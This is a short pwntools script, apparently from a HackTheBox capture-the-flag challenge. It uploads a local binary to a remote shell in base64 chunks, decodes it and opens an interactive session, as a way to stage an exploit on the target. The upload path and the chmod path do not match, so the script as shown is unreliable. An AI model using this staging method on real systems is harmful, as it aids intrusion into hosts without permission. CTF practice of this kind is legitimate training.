#!/usr/bin/env python2
from pwn import *

def send_command(cmd, print_cmd = True, print_resp = False):
    if print_cmd:
        log.info(cmd)

    s.sendlineafter("$", cmd)
    resp = s.recvuntil("$")

    if print_resp:
        log.info(resp)

    s.unrecv("$")
    return resp

def send_file(name):
    file = read(name)
    f = b64e(file)

    #send_command("rm /home/ctf/a.gz.b64")
    #send_command("rm /home/ctf/a.gz")
    #send_command("rm /home/ctf/a")

    size = 800
    for i in range(len(f)/size + 1):
        log.info("Sending chunk {}/{}".format(i, len(f)/size))
        send_command("echo -n '{}'>>/home/ctf/a.out.b64".format(f[i*size:(i+1)*size]), False)

    send_command("cat /home/ctf/a.out.b64 | base64 -d > /home/ctf/a.out")
    #send_command("gzip -d /home/ctf/a.gz")
    send_command("chmod +x /home/ctf/a")

def exploit():
    send_file("a.out")
    #send_command("/home/note/a")
    #s.sendline("/home/ctf/a")
    s.interactive()

if __name__ == "__main__":

    #context.log_level = 'debug'
    s = remote("docker.hackthebox.eu",30704)
    exploit()

